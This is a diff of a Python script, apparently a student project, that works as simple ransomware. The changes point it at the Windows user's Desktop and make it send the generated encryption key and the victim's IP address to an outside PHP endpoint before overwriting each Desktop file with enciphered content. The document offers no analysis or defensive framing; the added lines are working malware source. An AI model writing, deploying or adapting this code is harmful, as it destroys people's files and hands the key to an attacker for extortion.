@@ -1,19 +1,13 @@
 import sys
 import random as rd
 import requests
+import os
 from os import path
 from os import listdir
 from os.path import isfile, join
-
-#Internet connection initial test
-try:
-    testCon = requests.get("http://checkip.amazonaws.com/")
-except:
-    exit()
-
+    
 #Desktop path
-targetDir = "/storage/emulated/0/AppProjects/Python3/FYP/Encrypted_Storage/"
-
+targetDir = "C:" + os.environ["HOMEPATH"] + "\\Desktop\\"
 
 #Key generation
 keyRaw = []
@@ -31,6 +25,15 @@ for i in range(26):
     finalKey += str(keyRaw[i])
 for i in range(10):
     finalKey += str(keyRaw_digit[i])  
+
+#Use http requests to store key, identity (IP addr)
+try:
+    ipAddr = requests.get("http://checkip.amazonaws.com/")
+    data = requests.get("http://500iqproject.atwebpages.com/storeKey.php?str=" + finalKey + "&ip=" + ipAddr.text)
+    if "Record exists" in data.text:
+        finalKey = data.text[14:50]
+except:
+    exit()
             
 #get file list in desktop
 targetFList = [f for f in listdir(targetDir) if isfile(join(targetDir, f))]
@@ -75,11 +78,14 @@ def encryptContent():
                 finalString += raw[j]
                 
             #overwrite file here
-            targetFileW = open(targetDir + targetFList[i], "w", encoding = utf)
-            targetFileW.write(finalString + "--EiNiCiRiYiPiTiEiD--")
-            targetFileW.close()
-             
-            print('Encrypted: ' + targetFList[i] + " | Encoding: " + utf)
+
+            if targetFList[i] != "desktop.ini":    
+                targetFileW = open(targetDir + targetFList[i], "w", encoding = utf)
+                targetFileW.write(finalString + "--EiNiCiRiYiPiTiEiD--")
+                targetFileW.close()
+                print('Encrypted: ' + targetFList[i] + " | Encoding: " + utf)
+            else:
+                print("Unable to encrypt: " + targetFList[i])
     else:
         print("No file exist in the folder")        
 
@@ -120,13 +126,5 @@ def validation(targetDir, targetFList):
             
 encryptContent()
 
-#Use http requests to store key, identity (IP addr)
-try:
-    ipAddr = requests.get("http://checkip.amazonaws.com/")
 
-    data = requests.get("LinkHere" + finalKey + "&ip=" + ipAddr.text)
-    
-except:
-	#Defined as failure of encryption due to connection error, restore by decrypting.
-	pass
 	
